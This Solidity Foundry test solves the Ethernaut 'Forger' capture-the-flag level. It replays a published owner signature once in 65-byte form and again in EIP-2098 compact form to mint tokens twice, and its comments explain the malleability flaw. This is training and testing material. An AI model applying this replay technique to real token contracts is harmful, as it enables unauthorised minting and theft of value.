// SPDX-License-Identifier: MIT
pragma solidity 0.8.30;

import {Test} from "forge-std/Test.sol";
import {Forger} from "../src/levels/Forger.sol";

/// Ethernaut "Forger" → EIP-2098 compact-signature replay
/// (catalog: `signature-replay-malleability`).
///
/// `createNewTokensFromOwnerSignature` guards replays with `signatureUsed[keccak256(signature)]`, but
/// recovers the signer with OZ `ECDSA.recover`, which accepts BOTH the 65-byte (r,s,v) form and the
/// 64-byte EIP-2098 compact (r, vs) form. The two encode the SAME signature (same recovered owner)
/// but hash to different keys — so the published 100-ether mint can be replayed once via its compact
/// form, minting 100 + 100 = 200 > 100. (No private key needed; the signature is public.)
///
/// Win: totalSupply() > 100 ether.
contract ForgerTest is Test {
    // The owner's published signature (from the level), over keccak256(abi.encode(receiver,amount,salt,deadline)).
    bytes32 constant R = 0xf73465952465d0595f1042ccf549a9726db4479af99c27fcf826cd59c3ea7809;
    bytes32 constant S = 0x402f4f4be134566025f4db9d4889f73ecb535672730bb98833dafb48cc0825fb;
    uint8 constant V = 28;

    address constant RECEIVER = 0x1D96F2f6BeF1202E4Ce1Ff6Dad0c2CB002861d3e;
    uint256 constant AMOUNT = 100 ether;
    bytes32 constant SALT = 0x044852b2a670ade5407e78fb2863c51de9fcb96542a07186fe3aeda6bb8a116d;

    function test_solve_forger() public {
        Forger f = new Forger();
        uint256 deadline = type(uint256).max;

        // 1) Redeem the published 65-byte signature: mints 100 ether (totalSupply == 100, not > 100).
        bytes memory sig65 = abi.encodePacked(R, S, V);
        f.createNewTokensFromOwnerSignature(sig65, RECEIVER, AMOUNT, SALT, deadline);
        assertEq(f.totalSupply(), 100 ether, "first mint");

        // 2) Same signature, EIP-2098 compact form: r ++ vs (vs packs s + parity bit). Different
        //    keccak => not "used"; recovers the identical owner => mints another 100 ether.
        bytes32 vs = bytes32(uint256(S) | (uint256(V - 27) << 255));
        bytes memory sig64 = abi.encodePacked(R, vs);
        f.createNewTokensFromOwnerSignature(sig64, RECEIVER, AMOUNT, SALT, deadline);

        assertGt(f.totalSupply(), 100 ether, "supply forged past the single signed mint");
        assertEq(f.totalSupply(), 200 ether);
    }
}
